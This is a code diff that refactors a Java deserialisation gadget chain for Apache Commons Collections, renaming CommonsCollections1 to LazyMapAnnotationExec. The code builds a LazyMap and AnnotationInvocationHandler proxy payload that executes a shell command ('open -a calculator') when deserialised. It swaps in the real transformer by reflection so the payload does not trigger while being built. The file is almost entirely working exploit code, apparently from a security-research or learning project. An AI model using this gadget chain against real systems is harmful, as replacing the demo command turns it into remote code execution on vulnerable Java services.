@@ -1,4 +1,6 @@
-package com.trganda.gadget.commonscollection;
+package com.trganda.gadget.cc3;
+
+import com.trganda.gadget.utils.Reflections;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -6,26 +8,20 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
-import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollections1 {
+public class LazyMapAnnotationExec {
 
-    public static Object getObject()
-            throws ClassNotFoundException,
-                    InvocationTargetException,
-                    InstantiationException,
-                    IllegalAccessException,
-                    NoSuchMethodException {
+    public static Object getObject() throws Exception {
+        ChainedTransformer fakeTransformer =
+                new ChainedTransformer(new Transformer[] {new ConstantTransformer("1")});
         ChainedTransformer chainedTransformer =
                 new ChainedTransformer(
                         new Transformer[] {
@@ -44,44 +40,40 @@ public class CommonsCollections1 {
                                     new Object[] {"open -a calculator"})
                         });
 
-        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap<>(), fakeTransformer);
 
-        Constructor annotationInvocationHandler =
-                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
-                        .getDeclaredConstructor(Class.class, Map.class);
-
-        annotationInvocationHandler.setAccessible(true);
-        InvocationHandler annoHandler =
+        InvocationHandler handler =
                 (InvocationHandler)
-                        annotationInvocationHandler.newInstance(Override.class, lazyMap);
-        // 代理了 Map 接口
+                        Reflections.getFirstCtor(
+                                        "sun.reflect.annotation.AnnotationInvocationHandler")
+                                .newInstance(Override.class, lazyMap);
+
         Map map =
                 (Map)
                         Proxy.newProxyInstance(
                                 ClassLoader.getSystemClassLoader(),
                                 new Class[] {Map.class},
-                                annoHandler);
+                                handler);
 
         InvocationHandler anotherHandler =
-                (InvocationHandler) annotationInvocationHandler.newInstance(Override.class, map);
+                (InvocationHandler)
+                        Reflections.getFirstCtor(
+                                        "sun.reflect.annotation.AnnotationInvocationHandler")
+                                .newInstance(Override.class, map);
+        Reflections.setFieldValue(lazyMap, "factory", chainedTransformer);
 
         return anotherHandler;
     }
-    public static void main(String[] args)
-            throws IOException,
-                    ClassNotFoundException,
-                    InvocationTargetException,
-                    InstantiationException,
-                    IllegalAccessException,
-                    NoSuchMethodException {
+
+    public static void main(String[] args) throws Exception {
         ObjectOutputStream oos =
                 new ObjectOutputStream(
-                        Files.newOutputStream(Paths.get("target/CommonsCollection1.bin")));
+                        Files.newOutputStream(Paths.get("target/LazyMapAnnotationExec.bin")));
         oos.writeObject(getObject());
 
         ObjectInputStream ois =
                 new ObjectInputStream(
-                        Files.newInputStream(Paths.get("target/CommonsCollection1.bin")));
+                        Files.newInputStream(Paths.get("target/LazyMapAnnotationExec.bin")));
         ois.readObject();
     }
 }
